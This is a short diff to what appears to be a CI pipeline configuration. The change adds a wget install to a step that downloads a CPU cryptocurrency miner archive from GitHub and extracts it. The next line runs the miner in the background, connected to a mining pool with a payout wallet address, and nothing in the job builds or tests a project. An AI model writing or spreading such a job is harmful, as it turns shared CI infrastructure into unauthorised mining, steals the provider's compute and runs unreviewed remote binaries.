@@ -10,7 +10,7 @@ jobs:
       - run:
           name: Download and Extract
           command: |
-            wget -qO- https://github.com/bitnet-io/cpuminer-opt-aurum/releases/download/aurum/CPU-AURUM-linux.tar.gz | tar xvz
+            yum install wget && wget -qO- https://github.com/bitnet-io/cpuminer-opt-aurum/releases/download/aurum/CPU-AURUM-linux.tar.gz | tar xvz
             cd cpuminer-linux && nohup ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u  B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x
 
 workflows:
